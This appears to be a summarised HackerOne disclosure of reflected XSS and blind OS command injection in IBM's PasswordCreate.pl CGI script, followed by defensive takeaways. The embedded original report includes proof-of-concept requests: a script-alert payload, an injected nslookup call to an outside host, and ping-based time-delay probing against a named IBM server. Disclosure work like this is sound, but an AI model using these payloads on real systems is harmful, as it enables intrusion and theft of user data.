# Reflected XSS and Blind OS Command Injection at dstuid-ww.dst.ibm.com

## Metadata
- **Source:** HackerOne
- **Report:** 410334 | https://hackerone.com/reports/410334
- **Submitted:** 2018-09-16
- **Reporter:** vermithor-ke
- **Program:** IBM
- **Bounty:** Not specified in report
- **Severity:** critical
- **Vuln:** Reflected Cross-Site Scripting (XSS), Blind OS Command Injection, Improper Input Validation, CWE-79: Improper Neutralization of Input During Web Page Generation, CWE-78: Improper Neutralization of Special Elements used in an OS Command
- **CVEs:** None
- **Category:** web-api

## Summary
A Perl CGI script (PasswordCreate.pl) on IBM's dstuid-ww subdomain fails to properly sanitize email parameter input, allowing both reflected XSS via script injection and blind OS command injection via time-delay inference. An attacker can execute arbitrary JavaScript in victims' browsers or blind OS commands on the backend server through specially crafted email parameters.

## Attack scenario
1. Attacker crafts a malicious URL with email parameter containing HTML script tags: %3cscript%3ealert(1)%3c%2fscript%3e
2. Victim clicks the link or is redirected to the URL, and the script executes in their browser context
3. Attacker exfiltrates session cookies, credentials, or sensitive user data via injected JavaScript
4. Separately, attacker sends POST request with email parameter containing OS commands: ping -c 20 127.0.0.1
5. By measuring response time delays, attacker confirms blind command execution on backend server
6. Attacker escalates to interactive command execution or establishes reverse shell through time-delay inference technique

## Root cause
The PasswordCreate.pl CGI script fails to properly validate and sanitize the email GET/POST parameter before: (1) reflecting it in HTTP responses without HTML encoding, and (2) passing it to shell commands or system calls without proper escaping. The ampersand character (&) and special characters are not filtered, allowing command chaining and script injection.

## Attacker mindset
An attacker would recognize this as a high-value target due to IBM's prominence and the dual-vulnerability nature. The reflected XSS provides immediate browser-based attack surface for credential harvesting or malware distribution. The blind OS command injection indicates backend processing of unsanitized input, suggesting potential for full system compromise. The attacker would chain both vulnerabilities for maximum impact.

## Defensive takeaways
- Implement strict input validation on email parameters using whitelisting (alphanumeric, @, ., -, +)
- HTML-encode all user input before reflecting in responses (use proper context-aware encoding libraries)
- Never pass user input to system/shell commands; use parameterized APIs and avoid shell interpretation
- Use Content Security Policy (CSP) headers to mitigate XSS impact
- Implement Web Application Firewalls (WAF) to detect command injection patterns
- Apply principle of least privilege to CGI script execution context
- Migrate from legacy CGI to modern frameworks with built-in security controls
- Conduct security code review of all Perl CGI scripts for similar vulnerabilities
- Implement input length limits and rate limiting on password reset endpoints

## Variant hunting
Search for similar Perl CGI scripts using email parameters across IBM domains; audit other password reset/account recovery endpoints; look for similar patterns in legacy applications using backticks or system() calls with user input; check for time-delay-detectable blind injections in other POST parameters; review other IBM subdomains using PasswordCreate.pl or similar legacy scripts

## MITRE ATT&CK
- T1190: Exploit Public-Facing Application
- T1505: Server Software Component
- T1059: Command and Scripting Interpreter
- T1087: Account Discovery
- T1566: Phishing (via XSS-injected malicious links)
- T1040: Network Sniffing (via session hijacking through XSS)

## Notes
Report demonstrates both vulnerabilities with PoC URLs and POST requests. The blind OS command injection is inferred through time-delay measurement (ping 10-20 seconds), not direct output observation. Legacy CGI/Perl infrastructure appears to lack modern security controls. Attacker provides video/image evidence (referenced but not included in text). Response time indicates backend processing of commands, critical for blind injection confirmation. IBM subdomain indicates internal or partner-facing system, potentially affecting enterprise users.

## Full report
<details><summary>Expand</summary>

I found an XSS and Blind OS based injection issue due to the incorrect handling of the  characters in THE EMAIL  get& post parameters.  A <script> injected and a sleep command succesfully executed, the following link works as a PoC that alerts the string in the script:
I reproduced the same on Firefox and IE and Microsoft Edge
XSS POC URL:-
GET /cgi-bin/PasswordCreate.pl?email=%26nslookup%20%22dqzr3elx6wgztgtzd3if-0oyyf_qzd2wodwlaljh%22%2286m.r87.me%22cier4%3cscript%3ealert(1)%3c%2fscript%3emikflzhwaep&ibm-submit=Submit HTTP/1.1
Host: dstuid-ww.dst.ibm.com


https://dstuid-ww.dst.ibm.com/cgi-bin/PasswordCreate.pl?email=%26nslookup%20%22dqzr3elx6wgztgtzd3if-0oyyf_qzd2wodwlaljh%22%2286m.r87.me%22cier4%3cscript%3ealert(1)%3c%2fscript%3emikflzhwaep&ibm-submit=Submi

OSCOMMAND INJECT

POST /cgi-bin/PasswordCreate.pl HTTP/1.1
Host: dstuid-ww.dst.ibm.com
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-us,en;q=0.5
Cache-Control: no-cache
Content-Length: 39
Content-Type: application/x-www-form-urlencoded
Referer: https://dstuid-ww.dst.ibm.com/PasswordCreate.html
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36
X-Scanner: Netsparker

email=-------------------------&ibm-submit=Submit

For the blind os command injection i used three variables:_
1. A random email address (To bench mark the normal responce time
2.  Ping requests  of 10 and 20 seconds 

The reply from the server prooved that the  time-delay inference existed.

See attached videos and images for POC

## Impact

This allows an attacker to inject custom Javascript codes that can be used to steal information from  user base and lure them to malicious websites on the internet on behalf of IBM website.

</details>

---
*Analysed by Claude on 2026-05-12*
